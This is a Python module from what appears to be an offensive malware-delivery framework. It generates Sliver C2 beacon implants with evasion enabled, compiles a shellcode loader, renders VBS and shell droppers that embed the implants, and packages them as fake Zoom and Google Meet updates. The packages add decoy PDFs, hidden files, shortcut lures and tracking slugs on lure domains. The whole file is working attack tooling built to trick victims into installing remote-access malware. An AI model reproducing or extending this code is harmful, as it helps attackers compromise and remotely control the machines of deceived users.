"""Artifact pipeline: generate implants, render droppers, package, hash, record.

Pure renderers are separated from the sliver/bridge calls so they are unit
testable without a teamserver. Every build uses a fresh random suffix and a
fresh implant, so two builds never share a hash.
"""

from __future__ import annotations

import base64
import hashlib
import secrets
import string
import subprocess
import tarfile
import tempfile
import time
import zipfile
from dataclasses import dataclass, field
from pathlib import Path

from .config import Settings
from .db import Database
from .lnk import lure_icon
from .sliver import BridgeError, SliverBridge

REPO_ROOT = Path(__file__).resolve().parent.parent
TEMPLATES = REPO_ROOT / "droppers"
LOADER_DIR = REPO_ROOT / "loader"

# Six delivery targets (os, arch). Windows uses the shellcode+loader chain,
# which Sliver only builds for windows/amd64 (and 386); everything else is a
# plain executable implant.
TARGETS: list[tuple[str, str]] = [
    ("windows", "amd64"),
    ("linux", "amd64"),
    ("linux", "arm64"),
    ("linux", "386"),
    ("darwin", "arm64"),
    ("darwin", "amd64"),
]

ALPHABET = string.ascii_lowercase + string.digits

# Lure profiles: the artifact names must match the social-engineering story of
# the page the victim lands on ("zoom update", "google meet update").
PROFILES: dict[str, dict[str, str]] = {
    "zoom": {
        "win": "Zoom-Update",
        "linux": "zoom-update",
        "mac": "Zoom Update",
        "token": "Zoom",
        "url": "https://us05web.telcom.stream",
    },
    "meet": {
        "win": "Google-Meet-Update",
        "linux": "google-meet-update",
        "mac": "Google Meet Update",
        "token": "Google-M",
        "url": "https://meet.telcom.stream",
    },
}


def rand4() -> str:
    return "".join(secrets.choice(ALPHABET) for _ in range(4))


def rand8() -> str:
    return "".join(secrets.choice(ALPHABET) for _ in range(8))


def slug() -> str:
    return "".join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(8))


def vbs_string_expr(data_b64: str, width: int = 4096) -> str:
    chunks = [data_b64[i : i + width] for i in range(0, len(data_b64), width)]
    if not chunks:
        return '""'
    return " & _\n    ".join(f'"{chunk}"' for chunk in chunks)


def minimal_pdf(title: str) -> bytes:
    safe = title.replace("(", "").replace(")", "").replace("\\", "")
    content = f"BT /F1 24 Tf 72 720 Td ({safe}) Tj ET\n"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length "
        + str(len(content)).encode()
        + b" >>\nstream\n"
        + content.encode()
        + b"endstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    out = bytearray(b"%PDF-1.4\n")
    offsets: list[int] = []
    for index, obj in enumerate(objects, start=1):
        offsets.append(len(out))
        out += f"{index} 0 obj\n".encode() + obj + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objects) + 1}\n".encode()
    out += b"0000000000 65535 f \n"
    for offset in offsets:
        out += f"{offset:010d} 00000 n \n".encode()
    out += (
        f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    )
    return bytes(out)


@dataclass
class BuildRequest:
    doc_name: str
    transport: str = "mtls"
    c2_url: str = ""
    evasion: bool = True
    beacon: bool = True
    interval: int = 60
    jitter: int = 35
    base_url: str = ""
    profile: str = "zoom"
    targets: list[tuple[str, str]] = field(default_factory=lambda: list(TARGETS))

    @property
    def naming(self) -> dict[str, str]:
        return PROFILES.get(self.profile, PROFILES["zoom"])


@dataclass
class Artifact:
    id: str
    os: str
    arch: str
    name: str
    path: str
    sha256: str
    size: int
    slug: str
    delivery: str
    doc_name: str


def render_windows(
    doc: str,
    suffix: str,
    loader_bytes: bytes,
    decoy_pdf: bytes,
    base_url: str,
    doc_name: str = "",
    icon_bytes: bytes = b"",
    icon_name: str = "Zoom.ico",
) -> str:
    template = (TEMPLATES / "win" / "dropper.vbs.tmpl").read_text(encoding="utf-8")
    expr = vbs_string_expr(base64.b64encode(loader_bytes).decode())
    return (
        template.replace("{{DOC}}", doc)
        .replace("{{TITLE}}", doc_name or doc)
        .replace("{{RAND4}}", suffix)
        .replace("{{LOADER_B64_EXPR}}", expr)
        .replace("{{DECOY_B64}}", base64.b64encode(decoy_pdf).decode())
        .replace("{{ICON_B64}}", base64.b64encode(icon_bytes).decode())
        .replace("{{ICON_NAME}}", icon_name)
        .replace("{{BASE_URL}}", base_url)
    )


def render_linux(doc: str, suffix: str, implant_bytes: bytes) -> str:
    template = (TEMPLATES / "linux" / "dropper.sh.tmpl").read_text(encoding="utf-8")
    return (
        template.replace("{{DOC}}", doc)
        .replace("{{UNIT}}", f"fleet-{suffix}")
        .replace("{{BIN_NAME}}", f".fleet-{suffix}")
        .replace("{{IMPLANT_B64}}", base64.b64encode(implant_bytes).decode())
    )


def delivery_block(artifact_os: str, name: str, doc: str, sha: str) -> str:
    if artifact_os == "windows":
        howto = f"open {name}  (or double-click; Windows hides the .vbs)"
    elif artifact_os == "darwin":
        howto = f"unzip then open the .app  ({name})"
    else:
        script = name[: -len(".tar.gz")] + ".sh"
        howto = f"tar xzf {name} && ./{script}"
    return f"{doc}\nsha256: {sha}\n{howto}\n"


class BuildError(RuntimeError):
    pass


class BuildPipeline:
    def __init__(self, config: Settings, database: Database, bridge: SliverBridge) -> None:
        self.config = config
        self.db = database
        self.bridge = bridge
        self.artifacts_dir = config.artifacts_dir
        self.artifacts_dir.mkdir(parents=True, exist_ok=True)

    # -- sliver --------------------------------------------------------------
    def _generate(self, os_name: str, arch: str, fmt: str, req: BuildRequest) -> bytes:
        last: Exception | None = None
        for attempt in range(3):
            payload = {
                "os": os_name,
                "arch": arch,
                "format": fmt,
                "transport": req.transport,
                "c2_url": req.c2_url,
                "is_beacon": req.beacon,
                "interval": req.interval,
                "jitter": req.jitter,
                "evasion": req.evasion,
                "name": f"fleet-{os_name}-{arch}-{int(time.time())}-{rand4()}",
            }
            try:
                resp = self.bridge.generate(payload)
                return base64.b64decode(resp["data_b64"])
            except BridgeError as exc:
                last = exc
                retryable = any(
                    k in str(exc) for k in ("closing", "Unavailable", "EOF", "target exists")
                )
                if not retryable or attempt == 2:
                    raise
                time.sleep(2 * (attempt + 1))
        raise BuildError(str(last))

    def _compile_loader(self, shellcode: bytes, workdir: Path) -> bytes:
        sc_path = workdir / "payload.bin"
        sc_path.write_bytes(shellcode)
        out_path = workdir / "loader.exe"
        script = LOADER_DIR / "build.sh"
        proc = subprocess.run(
            ["bash", str(script), str(sc_path), str(out_path)],
            capture_output=True,
            text=True,
        )
        if proc.returncode != 0:
            raise BuildError(f"loader build failed: {proc.stderr.strip() or proc.stdout.strip()}")
        return out_path.read_bytes()

    # -- per-target builders -------------------------------------------------
    def _build_windows(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
        shellcode = self._generate("windows", arch, "shellcode", req)
        loader = self._compile_loader(shellcode, workdir)
        decoy = minimal_pdf(req.doc_name)
        naming = req.naming
        icon_name = f"{naming['win'].split('-')[0]}.ico"  # Zoom.ico / Google.ico
        source = render_windows(
            naming["win"], self._current_suffix, loader, decoy, req.base_url,
            req.doc_name, lure_icon(), icon_name,
        )
        # stable names: the .lnk downloads these exact files from dl.<zone>
        vbs_name = f"{naming['win']}.pdf.vbs"
        lnk_name = f"{naming['win']}.lnk"
        ico_name = icon_name
        (self.artifacts_dir / vbs_name).write_text(source, encoding="utf-8")
        (self.artifacts_dir / ico_name).write_bytes(lure_icon())

        src_lnk = TEMPLATES / "win" / "zoom-update.lnk" if req.profile == "zoom" else \
            TEMPLATES / "win" / "meet-update.lnk"
        if src_lnk.is_file():
            (self.artifacts_dir / lnk_name).write_bytes(src_lnk.read_bytes())

        name = f"{naming['win']}.zip"
        with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr(vbs_name, source)
            zf.write(self.artifacts_dir / ico_name, ico_name)
            if (self.artifacts_dir / lnk_name).is_file():
                zf.write(self.artifacts_dir / lnk_name, lnk_name)
        return name.encode()

    def _build_linux(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
        implant = self._generate("linux", arch, "executable", req)
        source = render_linux(req.naming["linux"], self._current_suffix, implant)
        dropper = workdir / "install.sh"
        dropper.write_text(source, encoding="utf-8")
        dropper.chmod(0o755)
        implant_path = workdir / f".fleet-{self._current_suffix}"
        implant_path.write_bytes(implant)
        implant_path.chmod(0o755)
        decoy_path = workdir / "decoy.pdf"
        decoy_path.write_bytes(minimal_pdf(req.doc_name))

        base = req.naming["linux"]
        name = f"{base}-{self._current_suffix}.tar.gz"
        with tarfile.open(self.artifacts_dir / name, "w:gz") as tar:
            tar.add(dropper, arcname=f"{base}-{self._current_suffix}.sh")
            tar.add(implant_path, arcname=f".fleet-{self._current_suffix}")
            tar.add(decoy_path, arcname="decoy.pdf")
        return name.encode()

    def _build_darwin(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
        implant = self._generate("darwin", arch, "executable", req)
        implant_path = workdir / "implant"
        implant_path.write_bytes(implant)
        implant_path.chmod(0o755)
        decoy_path = workdir / "decoy.pdf"
        decoy_path.write_bytes(minimal_pdf(req.doc_name))

        app_dir = workdir / f"{req.naming['mac']} {self._current_suffix}.app"
        subprocess.run(
            [
                "bash",
                str(TEMPLATES / "mac" / "build_app.sh"),
                str(app_dir),
                req.naming["mac"],
                str(decoy_path),
                str(implant_path),
            ],
            capture_output=True,
            text=True,
            check=False,
        )
        if not app_dir.is_dir():
            raise BuildError("mac bundle assembly failed")

        name = f"{req.naming['mac']}_{self._current_suffix}.app.zip"
        with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
            for path in sorted(app_dir.rglob("*")):
                if path.is_file():
                    zf.write(path, path.relative_to(workdir))
        return name.encode()

    # -- orchestration -------------------------------------------------------
    def build(self, req: BuildRequest) -> list[Artifact]:
        results: list[Artifact] = []
        for os_name, arch in req.targets:
            self._current_suffix = rand4()
            with tempfile.TemporaryDirectory(prefix="fleet-build-") as tmp:
                workdir = Path(tmp)
                if os_name == "windows":
                    builder = self._build_windows
                elif os_name == "darwin":
                    builder = self._build_darwin
                elif os_name == "linux":
                    builder = self._build_linux
                else:
                    raise BuildError(f"unknown os {os_name}")
                filename = builder(req, req.doc_name, arch, workdir).decode()

            artifact_path = self.artifacts_dir / filename
            digest = hashlib.sha256(artifact_path.read_bytes()).hexdigest()
            artifact_id = secrets.token_hex(8)
            artifact_slug = slug()
            delivery = delivery_block(os_name, filename, req.doc_name, digest)
            result = Artifact(
                id=artifact_id,
                os=os_name,
                arch=arch,
                name=filename,
                path=str(artifact_path),
                sha256=digest,
                size=artifact_path.stat().st_size,
                slug=artifact_slug,
                delivery=delivery,
                doc_name=req.doc_name,
            )
            self._record(result, req.transport, req.profile)
            results.append(result)
        return results

    def _record(self, artifact: Artifact, transport: str, profile: str = "") -> None:
        now = time.time()
        with self.db.connect() as conn:
            conn.execute(
                "INSERT INTO artifacts (id, ts, os, arch, fmt, transport, name, path, sha256, "
                "size, build_id, slug, delivery, doc_name, profile) "
                "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                (
                    artifact.id,
                    now,
                    artifact.os,
                    artifact.arch,
                    "dropper",
                    transport,
                    artifact.name,
                    artifact.path,
                    artifact.sha256,
                    artifact.size,
                    "",
                    artifact.slug,
                    artifact.delivery,
                    artifact.doc_name,
                    profile,
                ),
            )
            conn.execute(
                "INSERT INTO slugs (slug, artifact_id, created, first_hit, hits, target) "
                "VALUES (?, ?, ?, 0, 0, ?)",
                (artifact.slug, artifact.id, now, f"{artifact.os}/{artifact.arch}"),
            )

    def recent(self, limit: int = 50) -> list[dict[str, object]]:
        with self.db.connect() as conn:
            rows = conn.execute(
                "SELECT * FROM artifacts ORDER BY ts DESC LIMIT ?", (limit,)
            ).fetchall()
        return [dict(row) for row in rows]


def load_build_request(form: dict[str, str], config: Settings) -> BuildRequest:
    base_url = form.get("base_url") or f"http://{config.public_host}"
    return BuildRequest(
        doc_name=form.get("doc_name") or config.document_name,
        transport=form.get("transport") or "mtls",
        c2_url=form.get("c2_url") or "",
        evasion=form.get("evasion", "1") not in {"0", "false", "no"},
        beacon=form.get("beacon", "1") not in {"0", "false", "no"},
        interval=int(form.get("interval") or "60"),
        jitter=int(form.get("jitter") or "35"),
        base_url=base_url.rstrip("/"),
        profile=form.get("profile") or "zoom",
    )
